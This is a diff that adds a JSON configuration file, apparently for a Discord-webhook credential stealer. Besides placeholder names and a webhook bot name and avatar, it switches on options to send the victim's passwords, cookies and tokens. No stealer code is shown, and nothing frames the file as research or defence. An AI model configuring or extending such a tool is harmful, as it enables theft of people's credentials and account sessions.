@@ -1,0 +1,30 @@
+{
+    "Title_Configs":[
+        {
+
+           "name": "ANYTHINGHERE",
+           "servername": "ANYTHINGHERE",
+           "program": "ANYTHING HERE"
+
+        }
+    ],
+
+    "Webhook_config":[
+        {
+
+          "Bot_Name": "ANYTHING HERE",
+          "Bot_Avatar": "PUT BOT AVATAR BY UPLOADING PICTURE TO DISCORD AND COPYING IMAGE ADDRESS"
+  
+        }
+    ],
+
+    "Other_Configs":[
+        {
+          "SendPasswords": true,
+          "SendCookie": true,
+          "SendToken": true
+        }
+    ]
+
+
+}
